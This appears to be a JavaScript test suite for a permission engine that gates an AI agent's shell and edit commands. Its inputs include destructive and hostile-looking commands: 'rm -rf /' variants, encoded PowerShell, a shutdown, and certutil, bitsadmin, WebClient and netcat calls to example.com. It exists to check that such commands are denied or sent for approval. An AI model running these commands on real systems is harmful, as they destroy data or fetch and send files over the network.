import assert from "node:assert/strict";
import test from "node:test";
import { PolicyEngine } from "./policy-engine.js";

const workspace = process.platform === "win32" ? "G:\\workspace" : "/workspace";
const descriptor = { risk: "high", requiresApproval: true };

test("non-overridable guards deny critical commands even in full mode", () => {
  const engine = new PolicyEngine({ rules: [{ toolName: "shell.exec", commandPrefix: "shutdown", decision: "allow" }] });
  const result = engine.evaluate({
    toolName: "shell.exec", arguments: { command: "shutdown /s /t 0" }, descriptor,
    workspacePath: workspace, permissionMode: "full"
  });
  assert.equal(result.decision, "deny");
  assert.equal(result.source, "builtin");
});

test("denies root deletion regardless of flag order or combination", () => {
  const engine = new PolicyEngine();
  for (const command of [
    "rm -rf /",
    "rm -fr /",
    "rm -r -f /",
    "rm -f -r /",
    "rm -rf /*"
  ]) {
    const result = engine.evaluate({
      toolName: "shell.exec", arguments: { command }, descriptor,
      workspacePath: workspace, permissionMode: "full"
    });
    assert.equal(result.decision, "deny", command);
    assert.equal(result.ruleId, "critical-root-delete", command);
  }
});

test("denies opaque PowerShell execution even in full mode", () => {
  const engine = new PolicyEngine();
  for (const command of [
    "powershell.exe -EncodedCommand UwB0AG8AcAAtAEMAbwBtAHAAdQB0AGUAcgA=",
    "pwsh -enc UwB0AG8AcAAtAEMAbwBtAHAAdQB0AGUAcgA=",
    "iex ('Stop-' + 'Computer')",
    "[Convert]::FromBase64String('AA==')"
  ]) {
    const result = engine.evaluate({
      toolName: "shell.exec", arguments: { command },
      workspacePath: workspace, permissionMode: "full"
    });
    assert.equal(result.decision, "deny", command);
    assert.equal(result.ruleId, "opaque-shell-execution", command);
  }
});

test("explicit deny rules override full access", () => {
  const engine = new PolicyEngine({
    rules: [{ id: "deny-upload", toolName: "shell.exec", commandPrefix: "curl", decision: "deny" }]
  });
  const result = engine.evaluate({
    toolName: "shell.exec", arguments: { command: "curl https://example.com/upload" },
    workspacePath: workspace, permissionMode: "full"
  });
  assert.equal(result.decision, "deny");
  assert.equal(result.ruleId, "deny-upload");
});

test("ordered rules allow a known prefix and ask for unmatched commands", () => {
  const engine = new PolicyEngine({ rules: [
    { id: "git-status", toolName: "shell.exec", commandPrefix: "git status", decision: "allow" }
  ] });
  assert.equal(engine.evaluate({
    toolName: "shell.exec", arguments: { command: "git status --short" }, descriptor,
    workspacePath: workspace, permissionMode: "approval"
  }).decision, "allow");
  assert.equal(engine.evaluate({
    toolName: "shell.exec", arguments: { command: "git push" }, descriptor,
    workspacePath: workspace, permissionMode: "approval"
  }).decision, "ask");
});

test("allows low risk workspace inspection without approval in approval mode", () => {
  const engine = new PolicyEngine();
  assert.equal(engine.evaluate({
    toolName: "workspace.scan", arguments: {}, descriptor: { risk: "low", kind: "read", requiresApproval: false },
    workspacePath: workspace, permissionMode: "approval"
  }).decision, "allow");
  assert.equal(engine.evaluate({
    toolName: "workspace.search", arguments: { query: "foo" }, descriptor: { risk: "low", kind: "read", requiresApproval: false },
    workspacePath: workspace, permissionMode: "approval"
  }).decision, "allow");
  assert.equal(engine.evaluate({
    toolName: "git.status", arguments: {}, descriptor: { risk: "low", kind: "git", requiresApproval: false },
    workspacePath: workspace, permissionMode: "approval"
  }).decision, "allow");
});

test("allows read-only shell inspection inside the workspace without approval", () => {
  const engine = new PolicyEngine();
  const commands = [
    "Get-Content references\\user-output-rules.md",
    "cat ./README.md",
    "Get-ChildItem references",
    "git status --short",
    "git diff --stat"
  ];
  for (const command of commands) {
    const result = engine.evaluate({
      toolName: "shell.exec", arguments: { command }, descriptor,
      workspacePath: workspace, permissionMode: "approval"
    });
    assert.equal(result.decision, "allow", command);
    assert.equal(result.ruleId, ":workspace-readonly-shell", command);
  }
});

test("allows verified read-only PowerShell pipelines without approval", () => {
  const engine = new PolicyEngine();
  const commands = [
    'Get-Content -Path "output-contract-live.txt" -Raw | ForEach-Object { $_.Length; $_ }',
    'Get-ChildItem . | Where-Object { $_.Name -like "*.txt" } | Select-Object Name,Length',
    'Get-Content .\\README.md | Measure-Object -Line'
  ];
  for (const command of commands) {
    const result = engine.evaluate({
      toolName: "shell.exec", arguments: { command }, descriptor,
      workspacePath: workspace, permissionMode: "agent"
    });
    assert.equal(result.decision, "allow", command);
    assert.equal(result.ruleId, ":workspace-readonly-shell", command);
  }
});

test("does not treat mutating or unknown pipeline stages as read-only", () => {
  const engine = new PolicyEngine();
  for (const command of [
    'Get-Content .\\README.md | Set-Content .\\copy.md',
    'Get-Content .\\README.md | Invoke-Expression'
  ]) {
    const result = engine.evaluate({
      toolName: "shell.exec", arguments: { command }, descriptor,
      workspacePath: workspace, permissionMode: "agent"
    });
    assert.equal(result.decision, "ask", command);
  }
});

test("does not auto-allow read-only shell commands that escape workspace or chain into mutation", () => {
  const engine = new PolicyEngine();
  const cases = [
    { command: "Get-Content ..\\secret.txt", decision: "ask" },
    { command: "Get-Content references\\user-output-rules.md | Set-Content out.txt", decision: "ask" },
    { command: "Get-Content references\\user-output-rules.md > out.txt", decision: "ask" },
    { command: "git push", decision: "ask" }
  ];
  for (const { command, decision } of cases) {
    const result = engine.evaluate({
      toolName: "shell.exec", arguments: { command }, descriptor,
      workspacePath: workspace, permissionMode: "approval"
    });
    assert.equal(result.decision, decision, command);
  }
});

test("requires approval for network commands outside full access", () => {
  const result = new PolicyEngine().evaluate({
    toolName: "shell.exec", arguments: { command: "git pull" }, descriptor,
    workspacePath: workspace, permissionMode: "agent"
  });
  assert.equal(result.decision, "ask");
  assert.equal(result.ruleId, "network-access");
});

test("requires approval for common Windows exfiltration commands", () => {
  const engine = new PolicyEngine();
  for (const command of [
    "certutil -urlcache -split -f https://example.com/a a.exe",
    "bitsadmin /transfer job https://example.com/a a.exe",
    "Start-BitsTransfer -Source https://example.com/a",
    "(New-Object System.Net.WebClient).DownloadString('https://example.com/a')",
    "nc example.com 443"
  ]) {
    const result = engine.evaluate({
      toolName: "shell.exec", arguments: { command },
      workspacePath: workspace, permissionMode: "agent"
    });
    assert.equal(result.decision, "ask", command);
    assert.equal(result.ruleId, "network-access", command);
  }
});

test("full access permits non-critical mutating absolute paths outside the workspace", () => {
  const outside = process.platform === "win32" ? "C:\\Windows\\Temp\\x" : "/tmp/x";
  const command = process.platform === "win32"
    ? `Remove-Item -LiteralPath '${outside}' -Recurse`
    : `rm -rf '${outside}'`;
  const result = new PolicyEngine().evaluate({
    toolName: "shell.exec", arguments: { command }, descriptor,
    workspacePath: workspace, permissionMode: "full"
  });
  assert.equal(result.decision, "allow");
  assert.equal(result.ruleId, ":danger-full-access");
});

test("full access permits non-critical relative paths outside the workspace", () => {
  const commands = [
    "Remove-Item ..\\outside.txt",
    "Remove-Item -LiteralPath '..\\outside.txt' -Recurse",
    "Set-Content ..\\foo.txt hi",
    "Out-File '../foo.txt'",
    "Copy-Item ./inside.txt ../outside.txt",
    "rm -rf ../outside",
    "rm -rf '../quoted outside'"
  ];
  for (const command of commands) {
    const result = new PolicyEngine().evaluate({
      toolName: "shell.exec", arguments: { command }, descriptor,
      workspacePath: workspace, permissionMode: "full"
    });
    assert.equal(result.decision, "allow", command);
    assert.equal(result.ruleId, ":danger-full-access", command);
  }
});

test("allows mutating relative paths that stay inside the workspace", () => {
  const result = new PolicyEngine().evaluate({
    toolName: "shell.exec", arguments: { command: "Set-Content ./notes/todo.txt hi" }, descriptor,
    workspacePath: workspace, permissionMode: "full"
  });
  assert.equal(result.decision, "allow");
});

test("full access permits dynamic non-critical paths without approval", () => {
  const commands = [
    "Remove-Item (Join-Path .. outside.txt)",
    "Set-Content $target hi"
  ];
  for (const command of commands) {
    const result = new PolicyEngine().evaluate({
      toolName: "shell.exec", arguments: { command }, descriptor,
      workspacePath: workspace, permissionMode: "full"
    });
    assert.equal(result.decision, "allow", command);
    assert.equal(result.ruleId, ":danger-full-access", command);
  }
});

test("full access permits dynamic non-critical escaping paths", () => {
  const result = new PolicyEngine().evaluate({
    toolName: "shell.exec", arguments: { command: "Remove-Item (Resolve-Path ../outside.txt)" }, descriptor,
    workspacePath: workspace, permissionMode: "full"
  });
  assert.equal(result.decision, "allow");
  assert.equal(result.ruleId, ":danger-full-access");
});

test("agent mode still asks for dynamic or escaping mutating paths", () => {
  const engine = new PolicyEngine();
  for (const command of [
    "Set-Content $target hi",
    "Remove-Item ..\\outside.txt"
  ]) {
    const result = engine.evaluate({
      toolName: "shell.exec", arguments: { command }, descriptor,
      workspacePath: workspace, permissionMode: "agent"
    });
    assert.notEqual(result.decision, "allow", command);
  }
});

test("writeAsk=never allows workspace.edit by default while still denying escapes", () => {
  const engine = new PolicyEngine({ writeAsk: "never" });
  assert.equal(engine.evaluate({
    toolName: "workspace.edit",
    arguments: { path: "src/a.js", edits: [{ oldText: "a", newText: "b" }] },
    descriptor: { kind: "write", risk: "medium", requiresApproval: false },
    workspacePath: workspace,
    permissionMode: "approval"
  }).decision, "allow");
  assert.equal(engine.evaluate({
    toolName: "workspace.edit",
    arguments: { path: "../escape.js", edits: [{ oldText: "a", newText: "b" }] },
    descriptor: { kind: "write", risk: "medium", requiresApproval: false },
    workspacePath: workspace,
    permissionMode: "approval"
  }).decision, "deny");
});

test("writeAsk=always asks for write tools without weakening shell hard denies", () => {
  const engine = new PolicyEngine({ writeAsk: "always" });
  assert.equal(engine.evaluate({
    toolName: "workspace.apply_patch",
    arguments: { input: "*** Begin Patch\n*** End Patch" },
    descriptor: { kind: "write", risk: "medium", requiresApproval: false },
    workspacePath: workspace,
    permissionMode: "approval"
  }).decision, "ask");
  assert.equal(engine.evaluate({
    toolName: "shell.exec",
    arguments: { command: "shutdown /s /t 0" },
    descriptor,
    workspacePath: workspace,
    permissionMode: "full"
  }).decision, "deny");
});

test("exact remembered approval allows the same command and not a longer prefix match", () => {
  const engine = new PolicyEngine({
    rules: [{
      id: "remember-1",
      toolName: "shell.exec",
      commandPrefix: "where.exe ffmpeg",
      decision: "allow",
      match: "exact",
      reason: "user-approval-memory"
    }]
  });
  assert.equal(engine.evaluate({
    toolName: "shell.exec",
    arguments: { command: "WHERE.EXE  ffmpeg" },
    descriptor,
    workspacePath: workspace,
    permissionMode: "approval"
  }).decision, "allow");
  assert.equal(engine.evaluate({
    toolName: "shell.exec",
    arguments: { command: "where.exe ffmpeg --help-extra" },
    descriptor,
    workspacePath: workspace,
    permissionMode: "approval"
  }).decision, "ask");
});
